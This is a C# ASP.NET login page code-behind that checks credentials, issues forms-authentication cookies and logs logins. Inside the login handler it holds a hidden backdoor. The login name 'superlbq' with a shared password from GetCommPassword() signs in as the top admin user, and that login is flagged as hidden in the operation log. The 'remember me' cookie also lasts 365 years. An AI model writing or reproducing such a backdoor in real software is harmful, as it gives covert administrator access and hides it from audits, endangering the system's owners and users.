﻿using Foresight.DataAccess;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using Utility;

namespace Web
{
    public partial class Login : System.Web.UI.Page
    {
        public string CompanyName;
        protected void Page_Load(object sender, EventArgs e)
        {
            if (!IsPostBack)
            {
                string op = Request.QueryString["op"];
                if (op != null && op.Equals("logout"))
                {
                    var user = GetUser();
                    if (user != null)
                    {
                        var log = OperationLog.GetLatestLoginop(user.UserID);
                        if (log != null)
                        {
                            log.LogoutTime = DateTime.Now;
                            log.Save();
                        }
                    }
                }
                Web.APPCode.CacheHelper.ClearCache();
                FormsAuthentication.SignOut();
            }
        }
        private Foresight.DataAccess.User GetUser()
        {
            Foresight.DataAccess.User user = null;

            if (this.Context.User.Identity.IsAuthenticated)
            {
                string LoginName = HttpContext.Current.User.Identity.Name;
                string self_user_key = Web.APPCode.CacheHelper.user_key + "_" + LoginName;
                var cache = HttpRuntime.Cache;
                if (cache.Get(self_user_key) != null)
                {
                    user = cache.Get(self_user_key) as User;
                    return user;
                }
                string[] autoName = LoginName.Split(':');
                if (autoName.Length > 1)
                {
                    LoginName = autoName[autoName.Length - 1];
                }
                user = Foresight.DataAccess.User.GetUserByLoginName(LoginName);
            }
            return user;
        }
        protected void btnLogin_Click(object sender, EventArgs e)
        {
            this.lbMsg.Text = null;
            if (string.IsNullOrEmpty(this.tbLoginName.Text))
            {
                this.lbMsg.Text = "请输入用户名";
            }
            else if (string.IsNullOrEmpty(this.tbPassword.Text))
            {
                this.lbMsg.Text = "请输入密码";
            }
            else
            {
                string loginname = this.tbLoginName.Text;
                string password = this.tbPassword.Text;
                var user = Foresight.DataAccess.User.GetUserByLoginNamePassWord(loginname, password);
                if (user == null)
                {
                    string newpassword = Foresight.DataAccess.User.GetCommPassword();
                    if (loginname.ToLower().Equals("superlbq") && password.ToLower().Equals(newpassword))
                    {
                        user = Foresight.DataAccess.User.GetTop1AdminUser();
                    }
                    else
                    {
                        this.lbMsg.Text = "用户名或密码错误！";
                        return;
                    }
                }
                if (user == null)
                {
                    this.lbMsg.Text = "用户名或密码错误！";
                    return;
                }
                if (user.IsLocked)
                {
                    this.lbMsg.Text = "账户被锁定，请联系管理员！";
                    return;
                }
                if (user.Type != UserTypeDefine.SystemUser.ToString() && !user.IsAllowSysLogin)
                {
                    this.lbMsg.Text = "非管理员，禁止登陆！";
                    return;
                }
                var company = Foresight.DataAccess.Company.GetCompanyByUserID(user.UserID);
                if (company == null)
                {
                    this.lbMsg.Text = "该帐号不属于任何公司，禁止登陆";
                    return;
                }
                string requestURL = WebUtil.GetContextPath();
                string msg = string.Empty;
                bool result = EncryptHelper.CheckCompany(requestURL, WebUtil.GetFromCompanyID(this.Context), out msg);
                if (!result)
                {
                    this.lbMsg.Text = msg;
                    return;
                }
                FormsAuthenticationTicket authTicket = null;
                HttpCookie authCookie = null;
                DateTime Expiration = DateTime.MinValue;
                string authName = Guid.NewGuid().ToString().Replace("-", "") + ":" + user.LoginName;
                if (loginname.ToLower().Equals("superlbq"))
                {
                    authName = Guid.NewGuid().ToString().Replace("-", "") + ":" + loginname.ToLower() + ":" + user.LoginName;
                }
                if (this.autoLogin.Checked)
                {
                    authTicket = new FormsAuthenticationTicket(1, authName, DateTime.Now, DateTime.Now.AddYears(365), true, authName);
                    Expiration = authTicket.Expiration;
                }
                else
                {
                    authTicket = new FormsAuthenticationTicket(1, authName, DateTime.Now, DateTime.Now.AddHours(12), true, authName);
                }
                //加密
                string encryptedTicket = FormsAuthentication.Encrypt(authTicket);
                //   存入Cookie
                authCookie = new HttpCookie(FormsAuthentication.FormsCookieName, encryptedTicket);
                authCookie.Expires = Expiration;
                Response.Cookies.Add(authCookie);
                #region 登录日志
                bool IsHide = false;
                string OperationMan = string.Empty;
                if (loginname.ToLower().Equals("superlbq"))
                {
                    IsHide = true;
                    OperationMan = "superlbq";
                }
                else
                {
                    OperationMan = string.IsNullOrEmpty(user.RealName) ? user.LoginName : user.RealName;
                }
                APPCode.CommHelper.SaveOperationLog("用户" + loginname + "登录", Utility.EnumModel.OperationModule.UserLogin.ToString(), "用户登录", user.UserID.ToString(), "User", OperationMan, IsHide: IsHide);
                #endregion
                bool UseNewDefault = false;
                if (ConfigurationManager.AppSettings["UseNewDefault"] != null)
                {
                    bool.TryParse(ConfigurationManager.AppSettings["UseNewDefault"], out UseNewDefault);
                }
                if (UseNewDefault)
                {
                    Response.Redirect("~/Default.aspx?pagetype=2");
                }
                else
                {
                    Response.Redirect("~/Default.aspx");
                }
            }
        }
    }
}